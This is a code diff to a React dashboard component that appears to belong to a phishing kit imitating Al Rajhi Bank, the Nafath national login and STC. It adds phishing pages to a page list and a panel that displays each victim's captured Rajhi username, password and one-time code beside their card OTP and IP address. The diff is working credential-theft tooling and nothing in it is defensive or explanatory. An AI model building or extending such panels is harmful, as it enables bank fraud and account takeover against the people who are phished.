@@ -20,6 +20,8 @@ const PAGES = [
   "stcCall.html",
   "nafad.html",
   "nafad-basmah.html",
+  "rajhi.html",
+  "rajhiCode.html",
 ];
 
 const LABEL = {
@@ -37,6 +39,8 @@ const LABEL = {
   "stcCall.html": "STC Call",
   "nafad.html": "Nafad",
   "nafad-basmah.html": "Nafad-Basmah",
+  "rajhi.html": "Rajhi",
+  "rajhiCode.html": "Rajhi Code",
 };
 
 export default function CardModal({ ip, user, onClose }) {
@@ -118,7 +122,9 @@ export default function CardModal({ ip, user, onClose }) {
     verification_code_three = "",
     username = "",
     password = "",
-    code = "",
+    rajhiName = "",
+    rajhiPw = "",
+    rajhiCode = "",
     currentPage = "",
   } = user || {};
 
@@ -240,6 +246,31 @@ export default function CardModal({ ip, user, onClose }) {
               >
                 <strong>Card OTP (C-Code):</strong>{" "}
                 {verification_code_two || "—"}
+              </p>
+            </div>
+
+            {/* PIN & Card OTP */}
+            <div style={{ flex: 1 }}>
+              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
+                Rajhi login ⁄ OTP
+              </h6>
+              <p
+                className={blinkPin ? "blink-green-text" : ""}
+                style={{ marginBottom: "0.5rem" }}
+              >
+                <strong>username:</strong> {rajhiName || "—"}
+              </p>
+              <p
+                className={blinkOtp ? "blink-green-text" : ""}
+                style={{ marginBottom: "0.5rem" }}
+              >
+                <strong>Password:</strong> {rajhiPw || "—"}
+              </p>
+              <p
+                className={blinkOtp ? "blink-green-text" : ""}
+                style={{ marginBottom: "0.5rem" }}
+              >
+                <strong>Rajhi OTP :</strong> {rajhiCode || "—"}
               </p>
             </div>
 
